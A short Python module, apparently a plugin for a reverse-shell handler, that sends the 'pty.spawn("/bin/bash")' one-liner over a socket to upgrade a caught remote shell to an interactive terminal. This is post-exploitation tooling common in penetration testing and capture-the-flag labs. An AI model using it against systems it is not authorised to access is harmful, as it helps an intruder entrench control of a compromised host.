"""
upgrayedd command.

Tries the pty.spawn("/bin/bash") trick to upgrade shell to pty.
"""

from .commands import *


def cmd_upgrayedd(sock, cmdline):
    upgrayedd = "/usr/bin/python -c 'import pty; pty.spawn(\"/bin/bash\")'" + "\n"
    sock.send(upgrayedd.encode())

commands.append(("upgrayedd", cmd_upgrayedd))
commandhelp.append(("upgrayedd", "attempt to spawn a pty using Python."))

